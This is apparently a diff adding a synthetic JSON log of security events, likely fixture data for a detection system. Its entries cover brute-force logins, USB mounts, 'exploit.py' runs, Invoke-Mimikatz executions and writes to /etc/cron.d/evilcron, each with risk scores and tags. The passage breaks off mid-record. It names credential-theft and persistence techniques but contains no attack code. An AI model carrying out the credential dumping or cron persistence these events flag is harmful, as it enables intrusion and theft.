@@ -1,0 +1,7745 @@
+[
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749462647.057602,
+    "event_id": "evt-100000"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749421083.057612,
+    "event_id": "evt-100001"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749447823.057615,
+    "event_id": "evt-100002"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749516862.057618,
+    "event_id": "evt-100003"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749511233.057621,
+    "event_id": "evt-100004"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749447105.057624,
+    "event_id": "evt-100005"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749472218.057626,
+    "event_id": "evt-100006"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749454967.057632,
+    "event_id": "evt-100007"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749496224.057636,
+    "event_id": "evt-100008"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749472642.057639,
+    "event_id": "evt-100009"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749425608.057642,
+    "event_id": "evt-100010"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749472644.057644,
+    "event_id": "evt-100011"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749500163.057648,
+    "event_id": "evt-100012"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749492303.057652,
+    "event_id": "evt-100013"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749515388.057656,
+    "event_id": "evt-100014"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749455939.05766,
+    "event_id": "evt-100015"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749493128.057664,
+    "event_id": "evt-100016"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749482540.057669,
+    "event_id": "evt-100017"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749499337.057672,
+    "event_id": "evt-100018"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749434872.057675,
+    "event_id": "evt-100019"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749435407.057677,
+    "event_id": "evt-100020"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749428357.05768,
+    "event_id": "evt-100021"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749468306.057684,
+    "event_id": "evt-100022"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749508330.057689,
+    "event_id": "evt-100023"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749477823.057693,
+    "event_id": "evt-100024"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749441003.057697,
+    "event_id": "evt-100025"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749503764.057701,
+    "event_id": "evt-100026"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749464132.057705,
+    "event_id": "evt-100027"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749519016.057707,
+    "event_id": "evt-100028"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749476281.05771,
+    "event_id": "evt-100029"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749430549.057712,
+    "event_id": "evt-100030"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749510656.057715,
+    "event_id": "evt-100031"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749461386.057717,
+    "event_id": "evt-100032"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749430033.057719,
+    "event_id": "evt-100033"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749437585.057723,
+    "event_id": "evt-100034"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749491754.057726,
+    "event_id": "evt-100035"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749438590.05773,
+    "event_id": "evt-100036"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749483598.057733,
+    "event_id": "evt-100037"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749471221.057737,
+    "event_id": "evt-100038"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749473584.057742,
+    "event_id": "evt-100039"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749512967.057745,
+    "event_id": "evt-100040"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749468179.05775,
+    "event_id": "evt-100041"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749451886.057754,
+    "event_id": "evt-100042"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749451781.057758,
+    "event_id": "evt-100043"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749430136.057762,
+    "event_id": "evt-100044"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749452429.057764,
+    "event_id": "evt-100045"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749493041.057767,
+    "event_id": "evt-100046"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749482607.057769,
+    "event_id": "evt-100047"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749470155.057772,
+    "event_id": "evt-100048"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749430973.057774,
+    "event_id": "evt-100049"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749473065.057776,
+    "event_id": "evt-100050"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749481423.057779,
+    "event_id": "evt-100051"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749508888.057782,
+    "event_id": "evt-100052"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749498745.057784,
+    "event_id": "evt-100053"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749434789.057787,
+    "event_id": "evt-100054"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749468988.057789,
+    "event_id": "evt-100055"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749506120.057792,
+    "event_id": "evt-100056"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749497380.057794,
+    "event_id": "evt-100057"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749467349.057796,
+    "event_id": "evt-100058"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749423930.0578,
+    "event_id": "evt-100059"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749510454.057803,
+    "event_id": "evt-100060"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749453045.057805,
+    "event_id": "evt-100061"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749466525.057808,
+    "event_id": "evt-100062"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749470199.05781,
+    "event_id": "evt-100063"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749419853.057812,
+    "event_id": "evt-100064"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749453221.057815,
+    "event_id": "evt-100065"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749431466.057818,
+    "event_id": "evt-100066"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749475271.057821,
+    "event_id": "evt-100067"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749455611.057825,
+    "event_id": "evt-100068"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749454776.057829,
+    "event_id": "evt-100069"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749488456.057832,
+    "event_id": "evt-100070"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749505884.057837,
+    "event_id": "evt-100071"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749437000.057842,
+    "event_id": "evt-100072"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749502293.057845,
+    "event_id": "evt-100073"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749497972.057847,
+    "event_id": "evt-100074"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749443961.05785,
+    "event_id": "evt-100075"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749499944.057852,
+    "event_id": "evt-100076"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749474250.057855,
+    "event_id": "evt-100077"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749468174.057859,
+    "event_id": "evt-100078"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749474158.057863,
+    "event_id": "evt-100079"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749482726.057867,
+    "event_id": "evt-100080"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749456636.057871,
+    "event_id": "evt-100081"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749468724.057875,
+    "event_id": "evt-100082"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749426645.057879,
+    "event_id": "evt-100083"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749498958.057883,
+    "event_id": "evt-100084"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749431027.057887,
+    "event_id": "evt-100085"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749500658.057891,
+    "event_id": "evt-100086"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749512004.057893,
+    "event_id": "evt-100087"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749426078.057895,
+    "event_id": "evt-100088"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749438094.057898,
+    "event_id": "evt-100089"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749439382.0579,
+    "event_id": "evt-100090"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749512935.057903,
+    "event_id": "evt-100091"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749462251.057906,
+    "event_id": "evt-100092"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749495206.05791,
+    "event_id": "evt-100093"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749507062.057914,
